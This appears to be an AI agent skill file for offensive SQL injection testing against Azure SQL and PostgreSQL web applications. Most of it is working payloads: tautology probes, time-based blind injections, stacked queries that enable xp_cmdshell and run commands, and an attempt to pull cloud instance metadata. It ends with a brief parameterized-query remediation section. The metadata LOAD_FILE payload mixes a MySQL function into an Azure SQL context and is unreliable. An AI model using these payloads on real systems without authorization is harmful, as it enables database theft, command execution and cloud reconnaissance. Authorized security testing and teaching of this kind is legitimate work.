---
name: offensive-sqli
description: "SQL injection testing skill for offensive security assessments and bug bounty hunting. Covers error-based, UNION-based, and blind SQLi with Azure SQL specific attack paths. Use when performing web application SQL injection testing, database enumeration, or assessing injection vectors in APIs."
domain: cybersecurity
subdomain: web-security
tags:
- sqli
- injection
- azure-sql
- database-security
- web-security
version: '1.0'
author: openshield
license: Apache-2.0
nist_csf:
- PR.AC-3
- PR.DS-1
- PR.DS-2
- DE.CM-1
- DE.AE-3
---

# SQL Injection — Offensive Testing Methodology

## When to Use
- When performing web application security testing on applications backed by Azure SQL or PostgreSQL.
- When validating if database input vectors are properly parameterized.
- When investigating potential data leakage via injection vulnerabilities.
- When performing bug bounty hunting or red team assessments against Azure-hosted APIs.

## Key Concepts

| Term | Definition |
|------|------------|
| Error-Based SQLi | Triggering database errors to reveal information about the database structure |
| UNION-Based SQLi | Using the UNION operator to combine the results of the original query with an attacker-defined query |
| Blind SQLi | Exploiting vulnerabilities where the database does not return data directly, using boolean or time-based inference |
| Parameterization | The practice of using prepared statements to separate SQL code from user data, preventing injection |

## Quick Workflow

1. Map all input vectors that reach the database (URL params, POST body, cookies, headers, API filters)
2. Insert probe payloads to detect classic SQLi; fall back to inferential (boolean/time-based) if no visible error
3. Identify database type and enumerate schema
4. Exploit to extract data or escalate privileges where in scope
5. Document findings and suggest remediation via parameterization

## Detection & Exploitation

### Basic Probes
```
' " ; -- /* */ # ) ( + , \  %
' OR '1'='1
" OR "1"="1
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Time-Based Blind (Azure SQL / PostgreSQL)
```sql
-- PostgreSQL
' OR pg_sleep(5) --
-- MSSQL / Azure SQL
' WAITFOR DELAY '0:0:5' --
```

### Azure-Specific Attack Paths
```sql
-- Azure SQL Managed Instance RCE (if misconfigured)
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
'; EXEC xp_cmdshell 'az vm list'; --

-- Instance metadata exfiltration via LOAD_FILE (if applicable)
' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance?api-version=2021-02-01') --
```

## Remediation Reference

Always use parameterized queries or ORM-safe patterns:

```javascript
// Safe Pattern: replacements
sequelize.query('SELECT * FROM users WHERE name = :name', { replacements: { name: user } })
// Safe Pattern: tagged template literal
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${user}`
```
